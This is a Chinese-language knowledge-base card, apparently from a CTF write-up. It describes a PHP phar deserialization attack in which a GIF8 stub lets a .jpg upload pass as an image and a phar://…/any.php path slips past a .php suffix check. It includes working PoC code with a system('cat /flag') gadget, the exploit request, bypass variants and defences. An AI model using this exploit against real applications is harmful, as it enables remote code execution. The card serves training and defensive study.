---
id: web-php-deserialization-phar-gif8-stub-inner-php-suffix-bypass
title: Phar 反序列化后缀绕过：GIF8 stub 过图片头 + phar 内层 .php 过包含检查
type: scenario
domain: web
path: web/php/deserialization
technique: phar-gif8-stub-inner-php-suffix-bypass
tags:
- php
- phar
- deserialization
- file-upload
- file-inclusion
- gif8
- suffix-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V113
  verified_at: '2026-11-06T02:00:10+08:00'
  notes: 已对照原文Polar_校园图库段核对：upload.php文件头检查、classes.php Helper::__destruct eval、GIF8 stub、setMetadata、任意后缀.jpg上传、phar://.../any.php通过.php后缀检查、cat /flag与flag均一致。未验证点：PoC未本机复跑；PHP版本/触发条件需按目标核实（卡内已注明8.0+差异）；frontmatter无sources/source_url。
url: /docs/web/php/deserialization/web-php-deserialization-phar-gif8-stub-inner-php-suffix-bypass/
draft: false
kb_aliases:
- Phar 后缀绕过
- GIF8 stub
- phar:// 内层 .php
- view.php 文件包含
- Polar 校园图库
---

## 一句话结论

当上传接口检查图片文件头、包含接口又要求路径以 `.php` 结尾时，可以把 PHAR 的 stub 设为 `GIF8<?php __HALT_COMPILER(); ?>` 通过图片头检查，上传为 `.jpg`；再用 `phar://uploads/xxx.jpg/any.php` 作为包含参数——内层 `any.php` 让参数以 `.php` 结尾通过后缀检查，`phar://` 仍按外层 `.jpg` 容器解析并触发 metadata/反序列化。

## 原理

- **PHAR 容器识别**：`phar://` 按文件内容识别 PHAR（stub 中 `__HALT_COMPILER();` + manifest），不要求 `.phar` 后缀；因此 `.jpg` 也能承载 PHAR。
- **GIF8 伪头**：PHAR stub 以 `GIF8` 开头，上传接口若只检查前几字节是否为图片 magic（GIF/PNG/JPEG），会误判为图片；stub 后仍可跟 `<?php __HALT_COMPILER(); ?>` 完成 PHAR 结构。
- **后缀检查绕过**：`view.php?file=...` 可能用 `substr($file,-4)==='.php'` 或 `strpos($file,'.php')` 检查；`phar://uploads/xxx.jpg/any.php` 字符串以 `.php` 结尾（或包含 `.php`），通过检查；但实际文件是 `xxx.jpg`，内层 `any.php` 只是 PHAR 内部路径，不要求存在。
- **触发反序列化**：`phar://` 打开时解析 metadata；若目标 PHP < 8.0，metadata 会自动反序列化并触发 gadget 的 `__wakeup`/`__destruct`；PHP 8.0+ 不再自动反序列化 metadata，但若应用显式 `unserialize` manifest/文件内容，仍可触发。
- **Gadget**：`classes.php` 中的恶意类（如 `Helper` 的 `type=eval`、`cmd=system(...)`）在反序列化时执行；本题最终 `cat /flag`。
- **为什么成立**：文件头检查、后缀检查、PHAR 解析三者看的不是同一个东西：检查看前缀/字符串后缀，PHAR 看容器结构。

## 触发条件

- 存在“上传图片并检查文件头”的功能，允许 `.jpg`/`.png` 等后缀；上传内容可控。
- 存在用用户可控路径做 `include`/`file_get_contents`/`file_exists` 的功能，且对路径做 `.php` 后缀/关键字检查。
- 代码中存在可利用的 gadget 类（`__wakeup`/`__destruct`/`__toString` 中的 eval/命令执行）。
- PHP 版本/触发方式允许 PHAR metadata 反序列化（<8.0 自动；8.0+ 需显式 `unserialize` 或应用逻辑）。
- 能生成 PHAR（本地 PHP `phar.readonly=Off`，或手工拼字节）。

## 利用步骤

1. 审计 `upload.php`（文件头检查）、`classes.php`（gadget）、`view.php`（包含 + `.php` 后缀检查）。
2. 构造 PHAR：`setStub("GIF8" . "<?php __HALT_COMPILER(); ?>")`；`setMetadata(new Helper(...))`；添加任意内嵌文件；保存为 `.phar`。
3. 把 `.phar` 重命名为 `.jpg` 上传，利用 `GIF8` 通过文件头检查。
4. 访问 `view.php?file=phar://uploads/<hash>.jpg/any.php`：字符串以 `.php` 结尾通过检查，`phar://` 解析外层 `.jpg` 并触发反序列化。
5. Gadget 执行 `system("cat /flag")`，读取回显；若 metadata 不触发，检查 PHP 版本并改用显式 `unserialize` 的 manifest 路径。
6. 清理上传文件。

## PoC

```php
<?php
class Helper {
    public $type = 'eval';
    public $cmd = 'system("cat /flag");';
}

$phar = new Phar("exp.phar");
$phar->startBuffering();
$phar->setStub("GIF8" . "<?php __HALT_COMPILER(); ?>");
$o = new Helper();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

```text
# 上传 exp.phar 为 exp.jpg，然后：
GET /view.php?file=phar://uploads/2a2512c88f54daed5d4acb5a8695d799.jpg/any.php
```

## 变体与关联

- **变体（其他伪头）**：`\xFF\xD8\xFF`（JPEG）、`\x89PNG`、`GIF89a`；按上传检查的 magic 选择。
- **变体（后缀检查）**：`phar://.../x.php`、`.../x.php.jpg`、`.../x.php%00`、大小写 `.PHP`；按检查实现尝试。
- **变体（触发点）**：`file_exists`/`filesize`/`getimagesize`/`include`/`file_get_contents` 对 `phar://` 路径都可能触发；不一定是 include。
- **变体（PHP 8+）**：metadata 不自动反序列化时，找显式 `unserialize`/`phar://.../manifest` 读取；或利用 `__destruct` 在其他对象上的触发。
- **关联卡片**：[[web-php-deserialization-phar-upload-jpg-wakeup-eval]]（PHAR 任意后缀上传 + `__wakeup` eval）、[[web-php-deserialization-compressed-phar-include-bypass]]（压缩 PHAR 绕过关键字）、[[web-generic-file-upload-magic-byte-gif-prefix-bypass]]（GIF 伪头）。
- **边界**：PHP 8.0+ metadata 行为变化；`phar.readonly=On` 无法本地生成（可手工拼）；后缀检查若用 `pathinfo` 取最后扩展名，`any.php` 可能不通过（需按实现调整）。

## 检测与防御

- **上传校验**：不要只看文件头/后缀；用 `getimagesize` + 重新编码、内容扫描、随机文件名、非 Web 可读目录；禁止上传可执行容器。
- **包含限制**：禁止 `phar://` 等流包装器（`stream_wrapper_unregister('phar')`）；包含路径用白名单/`realpath`。
- **反序列化防护**：不要对用户可控数据 `unserialize`；使用 `allowed_classes`/签名；升级 PHP 并避免危险 gadget。
- **检测**：扫描上传文件中的 `__HALT_COMPILER`/`GIF8` + PHAR manifest；监控 `phar://` 参数与 `view.php` 异常包含。
